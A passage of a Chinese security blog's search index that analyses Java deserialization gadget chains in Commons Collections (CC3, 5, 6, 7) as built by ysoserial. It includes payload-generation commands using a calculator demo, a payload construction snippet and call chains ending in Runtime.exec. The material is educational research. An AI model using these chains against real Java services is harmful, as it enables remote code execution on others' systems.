block\u5728\u7c7b\u8f7d\u5165\u65f6\u81ea\u52a8\u6267\u884c\u5757\u5185\u7684\u4ee3\u7801\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7javassist\u5bf9\u9759\u6001\u5757\u6ce8\u5165\u4efb\u610f\u4ee3\u7801\uff0c\u8be5\u7c7b\u88ab\u6062\u590d\u5e76\u8f7d\u5165\u65f6\u4f1a\u8c03\u7528\u6ce8\u5165\u7684\u4ee3\u7801\uff0c\u540e\u6587\u7684\u5229\u7528\u94fe\u4e3b\u8981\u5c31\u662f\u7528\u5230\u4e86\u8fd9\u4e24\u4e2a\u77e5\u8bc6\u70b9\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x03","title":"0x03 \u5229\u7528\u94fe\u5206\u6790","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#1","title":"1. \u524d\u666f\u56de\u987e","text":"<p>\u8fd9\u91cc\u9009\u62e9CommonsCollections3\u662f\u56e0\u4e3a\u4ed6\u7684\u524d\u534a\u6bb5\u89e6\u53d1\u7684\u5229\u7528\u94fe\u8ddfCommonsCollections1\u662f\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ea\u9700\u8981\u5206\u6790\u540e\u534a\u6bb5\u547d\u4ee4\u6267\u884c\u7684\u6784\u9020\u5373\u53ef\u3002\u56de\u987e\u4e00\u4e0b\u524d\u534a\u6bb5\u5229\u7528\u94fe</p> <pre><code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()\n    -&gt; memberValues.entrySet()\n    -&gt; AnnotationInvocationHandler.invoke()\n    -&gt; memberValues.get() =&gt; LazyMap.get()\n    -&gt; factory.transform() =&gt; ChainedTransformer.transform()\n    -&gt; iTransformers[].transform()\n</code></pre> <p>CommonsCollections1\u4e2dChainedTransformer.transform()\u4f1a\u5faa\u73af\u8c03\u7528iTransformers\u6570\u7ec4\u91cc\u7684\u5bf9\u8c61\u7684transform\u51fd\u6570\u3002CommonsCollections1\u7528\u7684\u662fInvokerTransformer\u7684transform\uff0c\u56e0\u4e3a\u8be5\u51fd\u6570\u5b9e\u73b0\u4e86\u53cd\u5c04\u8c03\u7528\u4efb\u610f\u7c7b\u7684\u529f\u80fd\u3002\u90a3\u4e48\u9664\u4e86\u4f7f\u7528InvokerTransformer\u8fd8\u6709\u6ca1\u6709\u5176\u4ed6\u7684\u65b9\u6cd5\uff1f\u7b54\u6848\u5f53\u7136\u662f\u80af\u5b9a\u7684\uff01</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#2","title":"2. \u65b0\u7684\u547d\u4ee4\u6267\u884c\u5229\u7528\u94fe","text":"<p>\u6765\u770b\u4e00\u4e0bCommonsCollections3\u7684payloads\u6784\u9020</p> <pre><code>Object templatesImpl = Gadgets.createTemplatesImpl(command);\n\n// real chain for after setup\nfinal Transformer[] transformers = new Transformer[] {\n      new ConstantTransformer(TrAXFilter.class),\n      new InstantiateTransformer(\n            new Class[] { Templates.class },\n            new Object[] { templatesImpl } )};\n// \u540e\u7eed\u7c7b\u4f3c \u7701\u7565\n</code></pre> <p><code>ConstantTransformer</code>\u4e0a\u4e00\u7bc7\u5df2\u7ecf\u8bf4\u8fc7\u4e86\uff0c\u5176<code>transform</code>\u4f1a\u8fd4\u56de\u6784\u9020\u65f6\u7684\u5bf9\u8c61\uff0c\u8fd9\u91cc\u5c31\u662f<code>TrAXFilter.class</code>\u5bf9\u8c61\u3002</p> <p>\u6211\u4eec\u91cd\u70b9\u6765\u770b<code>InstaniateTransformer</code>\u7684<code>transform</code>\u51fd\u6570</p> <p></p> <p>\u7b80\u5355\u6765\u770b\uff0c\u8be5\u51fd\u6570\u5bf9\u8f93\u5165\u7684input\uff08\u8fd9\u91cc\u5c31\u662fTrAXFilter.class\uff09\u505a\u5b9e\u4f8b\u5316\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u770b\u8d77\u6765\uff0c\u5176\u5b9e\u6709\u70b9\u50cfphp\u4e2d\u627e\u5bf9\u5e94\u7684__constructs\uff0c\u5728Java\u91cc\u6211\u4eec\u5c31\u53bb\u627e\u6784\u9020\u51fd\u6570\u91cc\u505a\u4e86\u5371\u9669\u64cd\u4f5c\u7684class\u3002</p> <p>\u6765\u770b\u4e00\u4e0b<code>TrAXFilter</code>\u7c7b\u7684\u6784\u9020\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u7684<code>templates</code>\u5c31\u662f\u4e0a\u9762exp\u4e2d\u6784\u9020\u7684<code>templatesImpl</code>.</p> <p>\u7ee7\u7eed\u770bTransformerImpl\u7684newTransformer\u51fd\u6570</p> <p><code>org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java:newTransformer:481</code></p> <p></p> <p>\u7ee7\u7eed\u770b<code>getTransletInstance</code></p> <p></p> <p>\u518d\u7ee7\u7eed<code>defineTransletClasses</code></p> <p></p> <p>\u770b\u5230\u8fd9\u91cc\u662f\u4e0d\u662f\u6709\u70b9\u719f\u6089\uff0c\u6ca1\u9519\uff0c\u8fd9\u91cc\u7528\u5230\u4e860x02\u4e2d\u7684\u4e24\u4e2a\u57fa\u7840\u77e5\u8bc6\u3002<code>defineTransletClasses</code>\u8fd8\u539f\u51fa\u7c7b\uff0c<code>getTransletInstance</code>\u8fdb\u884c\u5b9e\u4f8b\u5316\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u5408\u9002\u7684<code>_bytecodes</code>\u5373\u53ef\u6267\u884c\u4efb\u610fJava\u4ee3\u7801\u3002</p> <p>\u4e0b\u9762\u8865\u5145\u4e00\u4e0b\uff0c\u5728\u6784\u9020exp\u65f6\u9700\u8981\u6ee1\u8db3\u7684\u6761\u4ef6\uff1a</p> <ol> <li>\u690d\u5165\u7684<code>templates</code>\u4e3a<code>TransformerImpl</code>\u7c7b\uff0c\u4ece\u800c\u8c03\u7528\u540e\u7eed\u7684<code>newTransformer</code>\u51fd\u6570</li> <li>\u690d\u5165\u7684<code>templates</code>\u5b9e\u4f8b\uff0c<code>_name</code>\u4e0d\u4e3a<code>null</code>,<code>_class</code>\u4e3a<code>null</code></li> <li>\u690d\u5165\u7684<code>templates</code>\u5b9e\u4f8b\uff0c<code>_bytecodes</code>\u4e0d\u4e3a<code>null</code>,<code>_tfactory</code>\u4e3a<code>TransformerFactoryImpl</code>\u5bf9\u8c61</li> <li>\u690d\u5165\u7684<code>templates._bytecodes</code>\u6570\u7ec4\uff0c\u5176\u6700\u7ec8\u8fd8\u539f\u7684\u5bf9\u8c61\u7236\u7c7b\u4e3a<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></li> </ol> <p>\u90a3\u4e48\u600e\u4e48\u624d\u80fd\u6ee1\u8db3\u8fd9\u4e9b\u6761\u4ef6\u5462\uff1f\u8fd9\u91cc\u795e\u5947\u7684javassist\u53c8\u8981\u4e0a\u573a\u5566\uff01</p> <p>\u6765\u770b\u4e00\u4e0bysoserial\u7684\u64cd\u4f5c</p> <p></p> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u505a\u7701\u7565\uff0c\u6211\u4eec\u5e94\u8be5\u597d\u597d\u5b66\u4e60\u4e00\u4e0bjavassist\u7684\u57fa\u672c\u64cd\u4f5c\uff0c\u4ee3\u7801\u53ef\u4ee5\u5728<code>Gadgets.createTemplatesImpl</code>\u627e\u5230\uff01</p> <p>\u8fd9\u91cc\u6846\u4e86\u4e24\u4e2a\u6846\uff0c\u7b2c\u4e00\u4e2a\u6846\u662f\u901a\u8fc7javassist\u6ce8\u5165\u9759\u6001\u5757\uff0c\u9759\u6001\u5757\u7684\u5185\u5bb9\u5c31\u662f\u6211\u4eec\u9700\u8981\u6267\u884c\u7684\u547d\u4ee4\u3002\u7b2c\u4e8c\u4e2a\u6846\u662fysoserail\u6846\u67b6\u81ea\u5df1\u5c01\u88c5\u7684\u4e00\u4e2a\u53cd\u5c04\u5de5\u5177\u7c7b\uff0c\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u6211\u4eec\u53ef\u4ee5\u52a8\u6001\u7684\u64cd\u4f5c<code>templates</code>\u5b9e\u4f8b\u7684\u7c7b\u5c5e\u6027\u5185\u5bb9\u3002\u8fd9\u91cc\u4e3b\u8981\u5c31\u662f\u5728\u6ee1\u8db3\u4e0a\u8ff0\u7684\u51e0\u4e2a\u6761\u4ef6\u3002</p> <p>\u8fd9\u91cc\u6709\u4e00\u70b9\u53ef\u4ee5\u63d0\u4e00\u4e0b\uff0c\u8be5\u5229\u7528\u94fe\u7684\u4f5c\u8005\u5728\u586b\u5145<code>_bytecodes</code>\u65f6\uff0c\u989d\u5916\u586b\u5145\u4e86\u4e00\u4e2a\u65e0\u5173\u7684\u7c7b(\u4e0a\u56fe\u7b2c130\u884c)\u3002\u8fd9\u4e2a\u7c7b\u4e3b\u8981\u7528\u4e8e\u6ee1\u8db3<code>_auxClasses</code>,\u8ba9\u8fd9\u4e2a<code>getTransletInstance</code>\u51fd\u6570\u80fd\u6b63\u5e38\u8d70\u5b8c\u3002</p> <p>\u7ecf\u8fc7\u4e0a\u9762\u7684\u5206\u6790\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u77e5\u9053<code>getTransletInstance</code>\u7684\u7b2c408\u884c\uff0c\u5bf9<code>_class</code>\u505a\u5b9e\u4f8b\u5316\u65f6\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u4ee3\u7801\u5c31\u5df2\u7ecf\u6267\u884c\u4e86\u3002\u6240\u4ee5\u8fd9\u91cc\u989d\u5916\u586b\u5145\u7684\u7c7b\u5176\u5b9e\u662f\u53ef\u6709\u53ef\u65e0\u7684\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#0x04","title":"0x04 \u603b\u7ed3","text":"<p>\u5230\u8fd9\u91cc\uff0c\u6574\u4e00\u4e2aCommonsCollections3\u5c31\u5206\u6790\u7ed3\u675f\u4e86\u3002</p> <p>CommonsCollections3\u4e3b\u8981\u5229\u7528\u4e86\u53ef\u63a7\u7684byte\u6570\u7ec4\u4ecedefineClass\u51fd\u6570\u4e2d\u8fd8\u539f\u51fa\u6076\u610f\u6784\u9020\u7684Class\u3002\u5e76\u4e14\u5728\u540e\u7eed\u7684\u8c03\u7528\u4e2d\uff0c\u8fd9\u4e2aClass\u88ab\u6ce8\u5165\u5230\u5185\u5b58\u4e2d\uff0c\u4ece\u800c\u6267\u884c\u4e86\u6ce8\u5165\u7684\u9759\u6001\u5757\u7684\u4ee3\u7801\uff0c\u5b9e\u73b0\u4e86\u4efb\u610fJava\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u5230\u8fd9\u7bc7\u4e3a\u6b62\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u4e24\u79cdJava\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u6784\u9020\u65b9\u5f0f</p> <ol> <li>\u5229\u7528\u53ef\u63a7\u7684\u53cd\u5c04\u673a\u5236\u3002\u5177\u4f53\u7684Class\u3001Method\u7b49\u5747\u53ef\u63a7\u65f6\uff0c\u5229\u7528\u53cd\u5c04\u673a\u5236\uff0c\u53ef\u4ee5\u6784\u9020\u51fa\u4efb\u610f\u7684\u7c7b\u8c03\u7528\u3001\u7c7b\u51fd\u6570\u8c03\u7528</li> <li>\u5229\u7528\u53ef\u63a7\u7684defineClass\u51fd\u6570\u7684byte\u6570\u7ec4\u3002\u6784\u9020\u6076\u610f\u7684Class\u5b57\u8282\u7801\u6570\u7ec4\uff0c\u5e38\u4e8e\u9759\u6001\u5757\u6ce8\u5165\u6076\u610f\u4ee3\u7801</li> </ol>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-3-20191028/#20191104","title":"20191104 \u8865\u5145","text":"<p>\u524d\u9762\u7684\u5206\u6790\u5e76\u6ca1\u6709\u63d0\u52303.2.2\u7248\u672c\u53d1\u751f\u4e86\u5565\u4e8b\uff0c\u5bfc\u81f4\u4e86\u5229\u7528\u94fe\u7684\u5931\u6548\uff0c\u8fd9\u91cc\u7b80\u5355\u63d0\u4e00\u4e0b</p> <p></p> <p>3.2.2\u7248\u672c\u5bf9InvokerTransformer\u589e\u52a0\u4e86readObject\u51fd\u6570\uff0c\u5e76\u4e14\u505a\u4e86\u662f\u5426\u5141\u8bb8\u53cd\u5e8f\u5217\u5316\u7684\u68c0\u67e5\uff0c\u5728<code>FunctorUtils.checkUnsafeSerialization</code>\u51fd\u6570\u5185\u3002</p> <p></p> <p>\u8fd9\u91ccUNSAFE_SERIALIZABLE_PROPERTY\u7684\u503c\u9ed8\u8ba4\u4e3afalse\uff0c\u5982\u679c\u9700\u8981\u4e3atrue\uff0c\u9700\u8981\u5728\u8fd0\u884c\u65f6\u6307\u5b9a\u3002</p> <p>\u6240\u4ee5\u5728\u4f7f\u7528InvokerTransformer\u4f5c\u4e3a\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u4f1athrow\u4e00\u4e2aexception\u3002\u9664\u4e86InvokerTransformer\u7c7b\u5916\uff0c\u8fd8\u6709CloneTransformer, ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,  PrototypeCloneFactory, PrototypeSerializationFactory, WhileClosure\u3002\u6240\u4ee5\u57283.2.2\u7248\u672c\u4ee5\u4e0a\uff0c\u57fa\u672c\u4e0a\u5229\u7528\u94fe\u90fd\u5df2\u7ecf\u5e9f\u4e86\u3002</p> <p>\u5f53\u7136\uff0c\u8fd9\u79cd\u65b9\u6cd5\u6cbb\u6807\u4e0d\u6cbb\u672c\uff0c\u5982\u679c\u53ef\u4ee5\u5728\u8fd9\u4e9b\u7c7b\u4ee5\u5916\uff0c\u6784\u9020\u4e00\u4e2a\u5229\u7528\u94fe\u540c\u6837\u53ef\u4ee5\u8fbe\u5230\u524d\u9762\u7684\u6548\u679c\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/","title":"Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections5,6,7,9,10","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x00","title":"0x00 \u524d\u8a00","text":"<p>\u672c\u6587\u7ee7\u7eed\u5206\u6790CommonsCollections\u7684\u76f8\u5173\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\uff0c\u8fd9\u6b21\u4e3b\u8981\u5206\u6790CommonsCollections5,6,7\uff0c\u4ee5\u53ca\u6211\u627e\u7684\u4e00\u4e2a\u65b0\u5229\u7528\u94fe\uff0c\u8fd9\u91cc\u6682\u4e14\u5c06\u5176\u79f0\u4e3a10.</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x01","title":"0x01 \u73af\u5883\u51c6\u5907","text":"<p>jdk8\uff0ccommons-collections:3.1</p> <pre><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 \"open /System/Applications/Calculator.app\" &gt; commonscollections5.ser\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 \"open /System/Applications/Calculator.app\" &gt; commonscollections6.ser\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 \"open /System/Applications/Calculator.app\" &gt; commonscollections7.ser\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#0x02","title":"0x02 \u5229\u7528\u94fe\u5206\u6790","text":"","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#1","title":"1. \u80cc\u666f\u56de\u987e","text":"<p>\u524d\u9762\u63d0\u5230\u8fc7CommonsCollections1\u548c3\u5728\u6784\u9020AnnotationInvocationHandler\u65f6\u7528\u5230\u4e86Override.class\u3002\u4f46\u662f\u5982\u679c\u4f60\u5728jdk8\u7684\u73af\u5883\u4e0b\u53bb\u8f7d\u5165\u751f\u6210\u7684payload\uff0c\u4f1a\u53d1\u751f<code>java.lang.Override missing element entrySet</code>\u7684\u9519\u8bef\u3002</p> <p>\u8fd9\u4e2a\u9519\u8bef\u7684\u4ea7\u751f\u539f\u56e0\u4e3b\u8981\u5728\u4e8ejdk8\u66f4\u65b0\u4e86<code>AnnotationInvocationHandler</code>\u53c2\u8003</p> <p></p> <p>jdk8\u4e0d\u76f4\u63a5\u8c03\u7528<code>s.defaultReadObject</code>\u6765\u586b\u5145\u5f53\u524d\u7684<code>AnnotaionInvocationHandler</code>\u5b9e\u4f8b\uff0c\u800c\u9009\u62e9\u4e86\u5355\u72ec\u586b\u5145\u65b0\u7684\u53d8\u91cf\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b\uff0c1\u548c3\u7684payload\u7684\u89e6\u53d1\u70b9\u662f<code>LazyMap.get</code>\u51fd\u6570\uff0c\u800c\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u4f7f\u5f97<code>memberValues</code>\u4e3a<code>LazyMap</code>\u5bf9\u8c61</p> <p></p> <p>\u663e\u7136\uff0cjdk8\u7684\u64cd\u4f5c\u4f7f\u5f97<code>memberValues</code>\u5e76\u4e0d\u662f\u6211\u4eec\u6784\u9020\u597d\u7684<code>LazyMap</code>\u7c7b\u578b\u3002\u5728\u8c03\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u770b\u5230\u6b64\u65f6\u7684<code>memberValues</code>\u4e3a<code>LinkedHashMap</code>\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u65e0\u6cd5\u83b7\u5f97<code>entrySet</code>\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u4f1a\u62a5\u524d\u9762\u7684\u8fd9\u4e2a\u9519\u8bef\u3002</p> <p>jdk8\u4e0bCommonsCollections1\u548c3\u65e0\u6cd5\u6210\u529f\u5229\u7528\u4e86\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a\u66ff\u4ee3AnnotationInvocationHandler\u7684\u5229\u7528\u65b9\u5f0f\u5462\uff1f\u8fd9\u5c31\u662f\u672c\u6587\u8981\u8bb2\u7684CommonsCollections5\uff0c6\uff0c7\u6240\u505a\u51fa\u7684\u6539\u53d8\u3002</p>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#2-commonscollections5","title":"2. \u91cd\u65b0\u6784\u9020\u524d\u534a\u90e8\u5206\u5229\u7528\u94fe--CommonsCollections5","text":"<p>CommonsCollections5\u4e0e1\u7684\u533a\u522b\u5728\u4e8eAnnotationInvocationHandler\uff0c\u540e\u90e8\u5206\u662f\u76f8\u540c\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u5206\u6790\u540e\u90e8\u5206\u3002</p> <p>AnnotationInvocationHandler\u5728\u524d\u9762\u8d77\u5230\u7684\u4f5c\u7528\u662f\u6765\u89e6\u53d1LazyMap.get\u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u662f\u8981\u91cd\u65b0\u627e\u4e00\u4e2a\u53ef\u4ee5\u89e6\u53d1\u8be5\u51fd\u6570\u7684\u5bf9\u8c61\u3002\u8fd9\u4e2a\u5bf9\u8c61\u6ee1\u8db3</p> <ul> <li>\u7c7b\u53ef\u5e8f\u5217\u5316\uff0c\u7c7b\u5c5e\u6027\u6709\u4e2a\u53ef\u63a7\u7684Map\u5bf9\u8c61\u6216Object</li> <li>\u8be5\u7c7b\u7684\u7c7b\u51fd\u6570\u4e0a\u6709\u8c03\u7528\u8fd9\u4e2aMap.get\u7684\u5730\u65b9</li> </ul> <p>CommonsCollections5\u5728\u8fd9\u91cc\u7528\u5230\u4e86TiedMapEntry\uff0c\u6765\u770b\u4e00\u4e0b</p> <p></p> <p>TiedMapEntry\u6709\u4e00\u4e2amap\u7c7b\u5c5e\u6027\uff0c\u4e14\u5728getValue\u5904\u8c03\u7528\u4e86map.get\u51fd\u6570\u3002\u540c\u65f6toString\u3001hashCode\u3001equals\u5747\u8c03\u7528\u4e86getValue\u51fd\u6570\uff0c\u8fd9\u91cc\u5173\u6ce8toString\u51fd\u6570\u3002</p> <p></p> <p>toString\u51fd\u6570\u901a\u5e38\u5728\u4e0e\u5b57\u7b26\u4e32\u62fc\u63a5\u65f6\uff0c\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\u3002\u90a3\u4e48\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u627e\u4e00\u4e2a\u5bf9\u8c61\u6ee1\u8db3</p> <ul> <li>\u7c7b\u53ef\u5e8f\u5217\u5316\uff0c\u7c7b\u5c5e\u6027\u6709\u4e2aMap.Entry\u5bf9\u8c61\u6216Object</li> <li>\u8be5\u7c7b\u4f1a\u81ea\u52a8\u8c03\u7528\u8fd9\u4e2a\u7c7b\u5c5e\u6027\u7684toString\u51fd\u6570\u6216\u524d\u9762\u7684\u53e6\u5916\u51e0\u79cd</li> </ul> <p>\u8fd9\u91cc\u9009\u62e9\u4e86<code>BadAttributeValueExpException</code>\u5bf9\u8c61\uff0c\u4ed6\u7684<code>readObject</code>\u51fd\u6570\u4f1a\u81ea\u52a8\u8c03\u7528\u7c7b\u5c5e\u6027\u7684<code>toString</code>\u51fd\u6570\u3002</p> <p></p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc<code>System.getSecurityManager</code>\u4e3a\u7a7a\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u5f53\u524d\u7684jvm\u73af\u5883\u4e0d\u80fd\u542f\u7528\u5b89\u5168\u7ba1\u7406\u5668\u3002</p> <p>\u6765\u770b\u4e00\u4e0b\u4e00\u6574\u4e2a\u8c03\u7528\u94fe</p> <pre><code>BadAttributeValueExpException.readObject()\n    -&gt; valObj.toString() =&gt; TiedMapEntry.getValue\n    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()\n    -&gt; factory.transform() =&gt; ChainedTransformer.transform()\n    -&gt; \u524d\u6587\u6784\u9020\u7684Runtime.getRuntime().exec()\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#3-commonscollections6","title":"3. \u91cd\u65b0\u6784\u9020\u524d\u534a\u90e8\u5206\u5229\u7528\u94fe--CommonsCollections6","text":"<p>CommonsCollections6\u662f\u53e6\u4e00\u79cd\u66ff\u6362\u65b9\u5f0f\uff0c\u540e\u534a\u90e8\u5206\u7684\u5229\u7528\u94fe\u8fd8\u662f\u6ca1\u6709\u53d8\uff0c\u4e0d\u4f5c\u5206\u6790\u3002</p> <p>\u6211\u4eec\u57282\u4e2d\u63d0\u5230\u4e86\u9664\u4e86CommonsCollections5\u7528\u7684<code>toString</code>\u5916\uff0c\u8fd8\u6709<code>hashCode</code>\u548c<code>equals</code>\u51fd\u6570\u4e5f\u8c03\u7528\u4e86getValue\u51fd\u6570\u3002\u90a3\u4e48\u662f\u5426\u5b58\u5728\u8c03\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\u7684\u5bf9\u8c61\u51fd\u6570\u5462\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff01</p> <p>CommonsCollections6\u5229\u7528\u4e86<code>TiedMapEntry</code>\u7684<code>hashCode</code>\u51fd\u6570\uff0c\u6765\u89e6\u53d1<code>LazyMap.get</code></p> <p>\u6211\u4eec\u90fd\u77e5\u9053HashSet\u96c6\u5408\u91cc\u4e0d\u4f1a\u5b58\u5728\u76f8\u540c\u7684key\uff0c\u90a3\u4e48\u662f\u5982\u4f55\u5224\u65ad\u662f\u5426\u662f\u76f8\u540c\u7684key\u5462\uff1f\u8fd9\u91cc\u5c31\u8981\u7528\u5230key\u7684hashCode\u51fd\u6570\u4e86\uff0c\u5982\u679ckey\u7684\u503c\u76f8\u540c\uff0c\u5176hashCode\u8fd4\u56de\u7684\u503c\u4e5f\u662f\u76f8\u540c\u7684\u3002\u8fd9\u91cc\u7684HashCode\u7684\u8ba1\u7b97\u5728HashSet\u7684put\u548cadd\u51fd\u6570\u5b8c\u6210\uff0c\u5e76\u4e14HashSet\u4ece\u5e8f\u5217\u5316\u6570\u636e\u4e2d\u8fd8\u539f\u51fa\u6765\u65f6\u4f1a\u81ea\u52a8\u8c03\u7528put\u51fd\u6570\uff0c\u8fd9\u91cc\u5c31\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u53ef\u63a7\u7684\u5730\u65b9\u3002</p> <p>\u5148\u6765\u770b\u4e00\u4e0bHashSet\u7684<code>readObject</code>\u51fd\u6570</p> <p></p> <p>\u7ee7\u7eed\u8ddfput\u51fd\u6570\uff0c\u8fd9\u91cc\u5176\u5b9e\u8c03\u7528\u7684\u662fHashMap\u7684put\u51fd\u6570</p> <p></p> <p>\u5176\u4e2d\u5bf9key\u8c03\u7528\u7684<code>hash()</code>\u51fd\u6570\u4f1a\u8c03\u7528<code>key.hashCode</code>\u51fd\u6570\uff0c\u90a3\u4e48\u73b0\u5728\u5c31\u5f88\u6e05\u695a\u4e86\uff0c\u6211\u4eec\u53ea\u8981\u5c06key\u7684\u503c\u66ff\u6362\u6210\u6784\u9020\u597d\u7684<code>TiedMapEntry</code>\u5bf9\u8c61\u5c31\u53ef\u4ee5\u4e86\u3002\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684key\u503c\u5176\u5b9e\u5c31\u662f<code>HashSet.add</code>\u7684\u5b9e\u4f8b\uff0c\u5728HashSet\u91cc\u7684HashMap\u7c7b\u5c5e\u6027\u53ea\u7528\u5230\u4e86Key\u3002</p> <p>\u6574\u7406\u4e00\u4e0b\u5229\u7528\u94fe</p> <pre><code>HashSet.readObject()\n    -&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode\n    -&gt; TiedMapEntry.getValue\n    -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()\n    -&gt; factory.transform() =&gt; ChainedTransformer.transform()\n    -&gt; \u524d\u6587\u6784\u9020\u7684Runtime.getRuntime().exec()\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#4-commonscollections7","title":"4. \u91cd\u65b0\u6784\u9020\u524d\u534a\u90e8\u5206\u5229\u7528\u94fe--CommonsCollections7","text":"<p>CommonsCollections7\u7528\u4e86Hashtable\u6765\u4ee3\u66ff<code>AnnotationInvocationHandler</code>\uff0c\u4e0d\u540c\u4e8e\u524d\u9762\u4e24\u79cdCommonsCollections7\u5e76\u672a\u4f7f\u7528<code>TiedMapEntry</code>\uff0c\u800c\u662f\u7528\u4e86\u76f8\u540ckey\u51b2\u7a81\u7684\u65b9\u5f0f\u8c03\u7528<code>equals</code>\u6765\u89e6\u53d1<code>Lazy.get</code>\u51fd\u6570\u3002</p> <p>\u5148\u6765\u770b\u4e00\u4e0b<code>Hashtable</code>\u7684<code>readObject</code>\u51fd\u6570</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb<code>reconstitutionPut</code></p> <p></p> <p>\u8be5\u51fd\u6570\u5c06\u586b\u5145table\u7684\u5185\u5bb9\uff0c\u5176\u4e2d\u7b2c1236\u884c\u4ec5\u5f53\u6709\u91cd\u590d\u6570\u636e\u51b2\u7a81\u65f6\uff0c\u624d\u4f1a\u8fdb\u5165\u4e0b\u9762\u7684if\u8bed\u53e5\uff0c\u8fd9\u91cc\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb<code>equals</code>\u51fd\u6570</p> <p>\u8fd9\u91cc\u7684<code>equals</code>\u51fd\u6570\u53d6\u51b3\u4e8e<code>key</code>\u7684\u5bf9\u8c61\uff0c\u5229\u7528\u94fe\u7528\u7684\u662f<code>LazyMap</code>\u5bf9\u8c61\uff0c\u5b9e\u9645\u8c03\u7528\u7684\u662f\u7236\u7c7b<code>AbstractMapDecorator</code>\u7684<code>equals</code>\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u53c8\u8c03\u7528\u4e86map\u7684equals\u51fd\u6570\uff0c\u8fd9\u91cc\u5b9e\u9645\u8c03\u7528\u7684\u662fHashMap\u7684\u7236\u7c7b<code>AbstractMap</code>\u7684<code>equals</code>\u51fd\u6570</p> <p></p> <p>\u5728\u7b2c495\u884c\u8c03\u7528\u4e86<code>m.get</code>\u51fd\u6570\uff0c\u6240\u4ee5\u540e\u9762\u53c8\u662f\u6211\u4eec\u719f\u6089\u7684<code>LazyMap.get</code>\u7684\u5957\u8def\u4e86\u3002</p> <p>\u6574\u7406\u4e00\u4e0b\u5229\u7528\u94fe</p> <pre><code>Hashtable.readObject()\n    -&gt; Hashtable.reconstitutionPut\n    -&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals\n    -&gt; m.get() =&gt; LazyMap.get()\n    -&gt; factory.transform() =&gt; ChainedTransformer.transform()\n    -&gt; \u524d\u6587\u6784\u9020\u7684Runtime.getRuntime().exec()\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-commonscollections3-others-20191031/#5","title":"5. 